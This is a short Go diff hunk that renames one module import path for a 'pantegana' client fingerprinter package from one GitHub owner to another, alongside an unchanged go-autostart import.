@@ -13,7 +13,7 @@ import (
 	"strconv"
 	"time"
 
-	"github.com/elleven11/pantegana/client/fingerprinter"
+	"github.com/cassanof/pantegana/client/fingerprinter"
 	"github.com/emersion/go-autostart"
 )
 
